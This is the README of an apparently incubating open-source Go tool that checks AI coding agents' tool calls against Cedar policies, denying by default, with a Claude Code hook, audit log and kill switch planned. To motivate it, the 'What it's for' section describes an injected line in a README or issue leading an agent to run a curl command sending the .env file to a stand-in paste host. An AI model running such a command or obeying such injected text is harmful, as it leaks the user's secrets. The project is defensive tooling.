<a id="readme-top"></a>

<h1 align="center">🛡️ AI Security Command Center</h1>

<p align="center">
  <em>Decide what every AI agent may do, prove what it did,<br>and stop it when it shouldn't.</em>
</p>

<p align="center">
  <a href="docs/README.md"><strong>Explore the docs »</strong></a>
</p>

<p align="center">
  <a href="docs/ROADMAP.md">Roadmap</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Report Bug</a>
  ·
  <a href="https://github.com/ai-automation-tools/ai-security-command-center/issues">Request Feature</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/status-incubating-F59E0B?style=for-the-badge" alt="Status: incubating">
  <a href="docs/ROADMAP.md"><img src="https://img.shields.io/badge/plan-ROADMAP-8B5CF6?style=for-the-badge" alt="Roadmap"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2ea44f?style=for-the-badge" alt="License: MIT"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go 1.26">
  <img src="https://img.shields.io/badge/Cedar-policies-FF9900?style=flat-square" alt="Cedar policies">
  <img src="https://img.shields.io/badge/Claude_Code-hook-D97757?style=flat-square" alt="Claude Code hook">
  <img src="https://img.shields.io/badge/network_calls-zero-6B7280?style=flat-square" alt="Network calls: zero">
</p>

---

> [!WARNING]
> **It decides, but it doesn't enforce yet.** `ascc decide` and `ascc inventory` work. The Claude Code hook, the
> audit log, the kill switch and the demo arrive one roadmap item at a time, so today nothing stops an agent.
> The [roadmap](docs/ROADMAP.md) says what's next.

## 🎯 What it's for

Your coding agent can run any command your shell can. One injected line in a README or an issue, and it runs
`curl -d @.env https://paste.example` for you. Allow-lists inside each tool don't add up to a policy, and
afterwards nobody can say what the agent was allowed to do.

ASCC (`ascc`) puts one policy decision point in front of the agent:

| Command | Status | What it does |
|:---|:---|:---|
| **`decide`** | works | Evaluates a request (agent, action, resource, context) against Cedar policies and an agent registry. Default deny, with the policy ids and a plain-English reason for every answer. |
| **`hook claude-code`** | planned | Runs as a Claude Code PreToolUse hook: asks `decide` before every tool call and blocks the denied ones. Any error is a deny. |
| **`audit verify`** | planned | Checks the hash-chained log every decision lands in and names the first line that was edited, removed or reordered. |
| **`kill` / `revive`** | planned | Suspends an agent so everything it asks for is denied, and brings it back. Both are audited. |
| **`inventory`** | works | Writes the registry as an Agent Security Suite inventory document, each agent labelled `enforced`, `observed` or `unmonitored`, with findings for agents that have no owner, no policy or are suspended. Until the hook exists every agent is `unmonitored`, because that label comes from evidence. |

The browser demo will run the same Go core as WebAssembly on a planted setup.

That's the public MVP. The full design, a gateway for MCP and LLM traffic, a credential broker, default-deny
egress, a plugin platform and NHI connectors, is in the [planning package](docs/product/plan/README.md) and gets
built in public after release.

### What it won't do (yet)

- Sit in the network path. No gateway or proxy in the MVP; the Claude Code hook is the only enforcement point.
- Make a network call, or hold or print a secret. The audit log keeps a hash of each tool input, not the input.
- Let a model decide. Decisions come from policy alone.
- Pretend to see what it can't. An agent it can't enforce on is reported as `unmonitored`.

## 🚀 Quick start

From a clone, with Go 1.26 or newer:

```bash
go build -o bin/ ./src/cmd/ascc   # builds bin/ascc (bin/ascc.exe on Windows)
cd examples                       # a sample registry, policies and requests, all fictional
../bin/ascc decide --request requests/exfil-curl.json
```

That request is `dev-agent` asking to run a shell command that touches a secret file and the network:

```json
{
  "decision": "deny",
  "policy_ids": [
    "deny-network-with-secret-path"
  ],
  "reason": "forbidden by deny-network-with-secret-path: a shell command may not send a secret file over the network"
}
```

`ascc` reads `ascc.registry.json` and every `policies/*.cedar` from the current folder; `--registry` and
`--policies` point it elsewhere, and `--request -` reads the request from stdin. `ascc inventory` prints the
inventory document, or writes it with `--out <file>`. Exit code 0 means a decision was made, allow or deny;
2 means ascc couldn't run, and `decide` still prints a deny.

What's denied without any policy saying so: an agent or a tool that isn't in the registry, a suspended or retired
agent, a request whose context doesn't fit the built-in schema, a policy that errors while evaluating, and
anything no policy permits. A registry with a typo, or a policy with no `@id` or one that reads an attribute
the schema doesn't have, stops ascc loading at all.

## 🗂️ What's in here

| Folder | What's inside |
|:---|:---|
| [**📚 docs/**](docs/README.md) | The roadmap, the changelog, the public-MVP spec and build plan, the full planning package and the resource library. |
| [**🧩 src/**](src/) | The Go code: `cmd/ascc` is the CLI, `internal/` holds the packages. Tests sit next to the code. |
| [**🧪 examples/**](examples/) | A sample registry, Cedar policies and requests with fictional agents. The tests run these same files. |
| [**📐 schemas/**](schemas/) | The Agent Security Suite inventory schema, v0.1, vendored from `ai-automation-tools.dev`. |
| [**🖥️ site/**](site/) | The demo page and its favicon. A "coming soon" shell for now. |

## 🛠️ Development

```bash
gofmt -l .        # must print nothing
go vet ./...
go test ./...
go build ./...
```

Agents working this repo read [AGENTS.md](AGENTS.md) first. Security reports go through
[SECURITY.md](SECURITY.md), not public issues.

---

<p align="center">
  Built with <a href="https://go.dev/">Go</a> · <a href="docs/README.md">Docs</a> · <a href="LICENSE">MIT License</a> · part of <a href="https://github.com/ai-automation-tools">ai-automation-tools</a>
</p>
